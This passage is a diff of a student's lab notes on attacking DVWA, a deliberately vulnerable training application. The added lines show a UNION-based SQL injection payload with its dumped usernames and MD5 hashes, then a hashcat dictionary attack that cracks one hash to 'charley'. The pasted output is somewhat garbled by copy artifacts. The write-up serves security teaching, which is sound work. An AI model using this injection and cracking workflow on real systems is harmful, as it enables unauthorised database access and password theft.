@@ -63,6 +63,28 @@
 > 
 > I injected into the session variable to manipulate the SQL query. This injection effectively combined a falsified SQL command with the original, intended to pull user names and passwords directly from the database.
 > 
+> ```
+> ID: ID: a' UNION SELECT user, password FROM users -- -&Submit=Submitit=Submit  
+First name: admin  
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+>
+>ID: ID: a' UNION SELECT user, password FROM users -- -&Submit=Submitit=Submit  
+>First name: gordonb  
+>Surname: e99a18c428cb38d5f260853678922e03
+>
+>ID: ID: a' UNION SELECT user, password FROM users -- -&Submit=Submitit=Submit  
+>First name: 1337  
+>Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+>
+>ID: ID: a' UNION SELECT user, password FROM users -- -&Submit=Submitit=Submit  
+>First name: pablo  
+>Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+>
+>ID: ID: a' UNION SELECT user, password FROM users -- -&Submit=Submitit=Submit  
+>First name: smithy  
+>Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+>```
+> 
 > The output displayed the hash for user ‘1337’ as `8d3533d75ae2c3966d7e0d4fcc69216b`. From workshop 8, we know that these are md5 hashes WITHOUT salts, so we can now begin decrypting it to plain text.
 > 
 > - I've added an excerpt from workshop 5 to verify this
@@ -70,17 +92,18 @@
 > passwords here are MD5 hashes, not plaintext passwords. But you can right away tell that the password for the user admin is the same as smithy, becuase their password hashes are identical (this is why password SALT is so important, as we will learn in later workshops).
 > ```
 > 
-> Using the same hashcat method from assignment 1 with the `rockyou.txt` dictionary:
+> Using the same hashcat method from assignment 1 with the `rockyou.txt` dictionary, we find that the plaintext password is `charley`
 > 
 > ```
 > hashcat -m 500 -o out hash rockyou.txt --force
+> 
+> ...
+> 
+> 8d3533d75ae2c3966d7e0d4fcc69216b:charley
 > ```
-> 
-> The wordlist used was a comprehensive compilation of known passwords, which aided in a successful brute-force attack, revealing that the plaintext form of the hash was `charley`.
-> 
 > To confirm the findings, I logged back into the DVWA using the credentials `1337` and `charley`, verifying that the password matched, thereby successfully exploiting the vulnerability and decrypting the hash.
 > 
-> This exercise illustrated the critical importance of sanitizing and validating all user inputs in web applications to prevent SQL injections and potential data breaches.
+> ![[Pasted image 20240502104809.png]]
 
 
 > [!exercise]+ Exercise 6
